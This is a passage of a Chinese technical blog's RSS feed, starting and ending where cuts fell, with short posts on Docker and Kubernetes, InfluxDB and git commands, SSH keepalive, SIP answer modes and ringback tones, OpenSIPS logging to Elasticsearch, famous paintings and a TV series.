&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;domain&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;domain&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;wj_route_group&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;join&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;domain&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;route_group_id&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>世界名画</title>
      <link>https://wdd.js.org/posts/2019/10/cgr19x/</link>
      <pubDate>Thu, 10 Oct 2019 21:28:42 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/cgr19x/</guid>
      <description>&lt;h1 id=&#34;你何时结婚&#34;&gt;你何时结婚 &lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-42-39.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;玩纸牌者&#34;&gt;玩纸牌者&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-42-53.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;梦&#34;&gt;梦&lt;/h1&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;h1 id=&#34;鲍尔夫人的肖像&#34;&gt;鲍尔夫人的肖像&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-04.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;呐喊&#34;&gt;呐喊&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-11.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;裸体-绿叶-半身像&#34;&gt;裸体 绿叶 半身像&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-19.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;加歇医生&#34;&gt;加歇医生&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-28.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;拿烟斗的男孩&#34;&gt;拿烟斗的男孩&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-35.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;老吉他手&#34;&gt;老吉他手&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-42.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;红黄蓝的构成ii-蒙德里安&#34;&gt;红黄蓝的构成II  蒙德里安&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-50.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;镜前少女&#34;&gt;镜前少女&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-43-57.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;神奈川冲浪&#34;&gt;神奈川冲浪&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/cgr19x/2022-10-29-19-44-05.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>虚拟化浪潮</title>
      <link>https://wdd.js.org/posts/2019/10/nzpt8a/</link>
      <pubDate>Thu, 10 Oct 2019 21:27:47 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/nzpt8a/</guid>
      <description>&lt;h1 id=&#34;刀耕火种没有docker的时代&#34;&gt;刀耕火种：没有docker的时代&lt;/h1&gt;
&lt;p&gt;想想哪些没有docker时光, 我们是怎么玩linux的。&lt;/p&gt;
&lt;p&gt;首先你要先装一个vmware或者virtualbox, 然后再下载一个几个GB的ISO文件，然后一步两步三步的经过十几个步骤，终于装好了一个虚拟机。这其中的步骤，每一步都可能有几个坑在等你踩。&lt;/p&gt;
&lt;p&gt;六年前，也就是在2013的时候，docker出现了，这个新奇的东西，可以让你用一行命令运行一个各种linux的发行版。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -it centos
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -it debian
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;黑色裂变docker时代&#34;&gt;黑色裂变：docker时代&lt;/h1&gt;
&lt;p&gt;docker 官网上，有个对docker非常准确的定位：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Docker: The Modern Platform for High-Velocity Innovation&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;我觉得行英文很好理解，但是不好翻译，从中抽取三个一个最终要的关键词。&amp;ldquo;High-Velocty&amp;rdquo;，可以理解为加速，提速。&lt;/p&gt;
&lt;p&gt;那么docker让devops提速了多少呢？&lt;/p&gt;
&lt;p&gt;没有docker的时代，如果可以称为冷兵器时代的话，docker的出现，将devops带入了热兵器时代。&lt;/p&gt;
&lt;p&gt;我们不用再准备石头，木棍，不需要打磨兵器，我们唯一要做的事情，瞄准目标，扣动扳机。&lt;/p&gt;
&lt;h1 id=&#34;运筹帷幄k8s时代&#34;&gt;运筹帷幄：k8s时代&lt;/h1&gt;
&lt;p&gt;说实在的，我还没仔细去体味docker的时代时，就已经进入了k8s时代。k8s的出现，让我们可以不用管docker, 可以直接跳过docker, 直接学习k8s的概念与命令。&lt;/p&gt;
&lt;p&gt;k8s的好处就不再多少了，只说说它的缺点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;资源消耗大：k8s单机版没什么意义，一般都是集群，你需要多台虚拟机&lt;/li&gt;
&lt;li&gt;部署耗费精力：想要部署k8s，要部署几个配套的基础服务&lt;/li&gt;
&lt;li&gt;k8s对于tcp服务支持很好，对于udp服务，&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以如果我们仅仅是需要一个环境，跑跑自己的代码，相比于k8s，docker无疑是最方便且便宜的选择。&lt;/p&gt;
&lt;p&gt;说实在的，我之前一直对docker没有全面的掌握，系统的学习，我将会在这个知识库里，系统的梳理docker相关的知识和实战经验。&lt;/p&gt;
&lt;h1 id=&#34;帝国烽烟云原生时代&#34;&gt;帝国烽烟：云原生时代&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;微服务&lt;/li&gt;
&lt;li&gt;应用编排调度&lt;/li&gt;
&lt;li&gt;容器化&lt;/li&gt;
&lt;li&gt;面向API&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Docker,_Inc.&#34;&gt;https://en.wikipedia.org/wiki/Docker,_Inc.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://thenewstack.io/10-key-attributes-of-cloud-native-applications/&#34;&gt;https://thenewstack.io/10-key-attributes-of-cloud-native-applications/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html&#34;&gt;https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.redhat.com/en/topics/cloud-native-apps&#34;&gt;https://www.redhat.com/en/topics/cloud-native-apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>influxdb http操作</title>
      <link>https://wdd.js.org/posts/2019/10/eqgykt/</link>
      <pubDate>Wed, 09 Oct 2019 16:22:18 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/eqgykt/</guid>
      <description>&lt;h1 id=&#34;创建数据库&#34;&gt;创建数据库&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;XPOST http:&lt;span style=&#34;color:#75715e&#34;&gt;//localhost:8086/query --data-urlencode &amp;#34;q=CREATE DATABASE testdb&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;写数据到数据库&#34;&gt;写数据到数据库&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;XPOST &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;http:&lt;span style=&#34;color:#75715e&#34;&gt;//localhost:8086/write?db=mydb&amp;#39; --data-binary &amp;#39;cpu_load_short,host=server01,region=us-west value=0.64 1434055562000000000&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;批量写入&#34;&gt;批量写入&lt;/h1&gt;
&lt;p&gt;output.txt&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx_second,tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ip169 value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1592638800000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx_second,tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ip169 value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1592638801000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx_second,tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ip169 value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1592638802000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx_second,tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ip169 value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1592638803000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -i -XPOST &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://localhost:8086/write?db=mydb&amp;#39;&lt;/span&gt; --data-binary @output.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/&#34;&gt;https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>ssh保持连接状态不断开</title>
      <link>https://wdd.js.org/posts/2019/10/swoxa5/</link>
      <pubDate>Sun, 06 Oct 2019 19:41:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/swoxa5/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;编辑这个文件 ~/.ssh/config
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;在顶部添加下边两行
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host *
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ServerAliveInterval&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;每隔30秒向服务端发送 no-op包&lt;/p&gt;</description>
    </item>
    <item>
      <title>UA应答模式的实现</title>
      <link>https://wdd.js.org/opensips/ch1/ua-answer-mode/</link>
      <pubDate>Thu, 26 Sep 2019 20:37:08 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/ua-answer-mode/</guid>
      <description>&lt;h1 id=&#34;notify&#34;&gt;Notify&lt;/h1&gt;
&lt;p&gt;使用noify消息，通知分机应答，这个notify一般发送在分机回180响应之后&lt;/p&gt;
&lt;h1 id=&#34;answer-mode&#34;&gt;Answer-mode&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Answer-Mode一般有两个值
&lt;ul&gt;
&lt;li&gt;Auto: UA收到INVITE之后，立即回200OK，没有180的过程&lt;/li&gt;
&lt;li&gt;Manual: UA收到INVITE之后，等待用户手工点击应答&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通常Answer-Mode还会跟着require, 表示某个应答方式如果不被允许，应当回403 Forbidden 作为响应。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Answer-Mode: Auto;require
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;和Answer-mode头类似的有个SIP头叫做：Priv-Answer-Mode，这个功能和Answer-Mode类似，但是他有个特点。&lt;/p&gt;
&lt;p&gt;如果UA设置了免打扰，Priv-Answer-Mode头会无视免打扰这个选项，强制让分机应答，这个头适合用于紧急呼叫。&lt;/p&gt;
&lt;h1 id=&#34;结论&#34;&gt;结论&lt;/h1&gt;
&lt;p&gt;如果要实现分机的自动应答，显然Answer-Mode的应答速度回更快。但是对于依赖180响应的系统，可能要考虑这种没有180相应的情况。&lt;/p&gt;
&lt;p&gt;要记住，在SIP消息里，对于UA来说，1xx的响应都是不必须的可以缺少的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>致命女人 Why Women Kill</title>
      <link>https://wdd.js.org/posts/2019/09/zgwg91/</link>
      <pubDate>Thu, 26 Sep 2019 20:12:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/zgwg91/</guid>
      <description>&lt;p&gt;前些天，有朋友推荐一部美剧《致命女人》，听着名字，觉得有点像特工或者犯罪系列的电视剧。&lt;/p&gt;
&lt;p&gt;看了前第一集之后，才发现这个剧是讲述关于婚姻方面问题美剧。&lt;/p&gt;
&lt;p&gt;一般情况下，我不喜欢看婚姻题材的影视。但是，任何事情都逃不过真相定律。&lt;/p&gt;</description>
    </item>
    <item>
      <title>git 删除未跟踪的文件</title>
      <link>https://wdd.js.org/posts/2019/09/vccx09/</link>
      <pubDate>Thu, 19 Sep 2019 17:02:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/vccx09/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clean -n &lt;span style=&#34;color:#75715e&#34;&gt;# 打印哪些文件将会被删除&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clean -f &lt;span style=&#34;color:#75715e&#34;&gt;# 删除文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clean -fd &lt;span style=&#34;color:#75715e&#34;&gt;# 删除文件个目录&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/61212/how-to-remove-local-untracked-files-from-the-current-git-working-tree&#34;&gt;https://stackoverflow.com/questions/61212/how-to-remove-local-untracked-files-from-the-current-git-working-tree&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>opensips日志写入elasticsearch</title>
      <link>https://wdd.js.org/opensips/ch3/elk/</link>
      <pubDate>Thu, 19 Sep 2019 09:01:40 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/elk/</guid>
      <description>&lt;h1 id=&#34;构造json&#34;&gt;构造json&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; :&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{}&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/time&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $time&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%F %T-0300&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/sipRequest&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; “INVITE”;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/ipIntruder&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $si;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/destNum&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $rU;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/userAgent&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $ua;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/country&lt;span style=&#34;color:#f92672&#34;&gt;)=&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;city&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/location&lt;span style=&#34;color:#f92672&#34;&gt;)=&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;latlon&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/ipHost&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $Ri;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用async-rest_post写数据&#34;&gt;使用async rest_post写数据&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;async好像存在于2.1版本及其以上， 异步的好处是不会阻止脚本的继续执行&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;async&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rest_post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://user:password@w.x.y.z:9200/opensips/1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(body)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ctype)&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ct)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(rcode)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,resume&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>pdf转ppt工具收集</title>
      <link>https://wdd.js.org/posts/2019/09/wn0a02/</link>
      <pubDate>Wed, 18 Sep 2019 10:50:42 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/wn0a02/</guid>
      <description>&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://smallpdf.com/&#34;&gt;https://smallpdf.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.pdfpai.com/pdf-to-powerpoint&#34;&gt;https://www.pdfpai.com/pdf-to-powerpoint&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>回铃音</title>
      <link>https://wdd.js.org/opensips/ch2/early-media/</link>
      <pubDate>Wed, 18 Sep 2019 09:53:22 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch2/early-media/</guid>
      <description>&lt;h1 id=&#34;特点分析&#34;&gt;特点分析&lt;/h1&gt;
&lt;p&gt;回铃音有以下特点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;回铃音是由运营商送给手机的，而不是由被叫送给主叫的。&lt;/li&gt;
&lt;li&gt;回铃音的播放阶段是在被叫接听前播放，被叫一旦接听，回铃音则播放结束&lt;/li&gt;
&lt;li&gt;回铃音一般是450Hz, 嘟一秒，停4秒，5秒一个周期&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见问题&#34;&gt;常见问题&lt;/h1&gt;
&lt;h2 id=&#34;听不到回铃音&#34;&gt;听不到回铃音&lt;/h2&gt;
